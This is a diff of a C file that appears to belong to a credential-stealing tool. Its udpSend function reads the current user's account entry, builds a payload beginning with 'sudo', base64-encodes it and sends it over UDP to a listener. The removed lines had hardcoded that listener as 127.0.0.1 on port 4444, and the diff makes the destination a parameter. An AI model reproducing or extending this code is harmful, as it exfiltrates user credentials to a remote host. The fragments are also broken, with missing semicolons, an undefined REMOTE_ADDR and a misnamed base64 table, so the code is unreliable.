@@ -1,14 +1,10 @@
 #include <stdint.h>
 #include <pwd.h>
-#include <config.h>
 #include <stdbool.h>
 #include <sys/types.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-
-char* DEST_IP="127.0.0.1"
-int PORT=4444
 
 char base46_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                      'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
@@ -50,7 +46,7 @@ char* base64_encode(char* plain) {
     return b64_encoded;
 }
 
-bool udpSend(const char* msg) {
+bool udpSend(const char* msg, int port, char* dest_ip) {
     struct passwd *p = getpwuid(getuid());
     char payload[100] = "";
     strcat(payload, "sudo");
@@ -69,11 +65,11 @@ bool udpSend(const char* msg) {
     memset(&serverAddr, '\0', sizeof(serverAddr));
 
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(PORT);
-    serverAddr.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+    serverAddr.sin_port = htons(port);
+    serverAddr.sin_addr.s_addr = inet_addr(dest_ip);
 
     strcpy(buffer, encoded);
     sendto(sockfd, buffer, strlen(encoded), 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
-    
     return true;
 }
+
